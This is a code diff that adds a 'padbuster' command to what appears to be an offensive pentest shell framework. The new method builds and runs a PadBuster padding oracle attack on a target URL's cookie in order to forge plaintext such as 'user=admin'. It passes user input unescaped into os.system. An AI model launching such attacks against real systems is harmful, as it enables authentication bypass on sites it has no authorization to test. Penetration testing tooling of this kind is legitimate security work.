@@ -7799,7 +7799,50 @@ class LazyOwnShell(Cmd):
         print_msg(f"Try... python3 modules/lazyseo.py http://{rhost}{RESET}")
         os.system(f"python3 modules/lazyseo.py http://{rhost}")
         return
-    
+        
+    def do_padbuster(self, line):   
+        """
+        Execute the PadBuster command for padding oracle attacks.
+
+        This function constructs and executes a PadBuster command to perform
+        a padding oracle attack on the specified URL. It requires the user
+        to provide a URL, a cookie with a hash, a plaintext value to compare, 
+        and a specific byte position to attack.
+
+        Parameters:
+        - line (str): The input line containing the cookie, plaintext, and byte 
+                    position. Expected format: 'cookie=<HASH> plaintext <byte_position>'.
+
+        Functionality:
+        - The function first checks if a URL is set in the parameters.
+        - It then validates that the correct number of arguments is provided.
+        - If the arguments are valid, it constructs the PadBuster command and executes it.
+        - The command is also copied to the clipboard for convenience.
+
+        Usage Example:
+        - set url http://target.com
+        - padbuster auth=<HASH> user=admin 8
+        """
+        url = self.params["url"]
+        if not url:
+            print_error(f"You need set the url using: {GREEN}set url http://url.com ")
+            return
+        args = line.split(" ")
+        if len(args) != 3:
+            print_error(f"You need pass the cookie like auth=<HASH> and plaintext like user=admin example:{GREEN} padbuster auth=b24dx2LYTEGrIsIsComEb4Ck user=admin 8")
+            return
+        elif len(args) == 3:
+            cookie = args[0].split("=")
+            plaintext = args[1]
+            number = args[2]
+            command = f"padbuster {url} '{cookie[1]}' {number} -cookie '{args[0]}' -plaintext '{plaintext}'" 
+            copy2clip(command)
+            os.system(command)
+            return
+        else:
+            print_error("wrong number of parameters.")
+            return
+
 def xor_encrypt_decrypt(data, key):
     """XOR Encrypt or Decrypt data with a given key"""
     key_bytes = bytes(key, "utf-8")
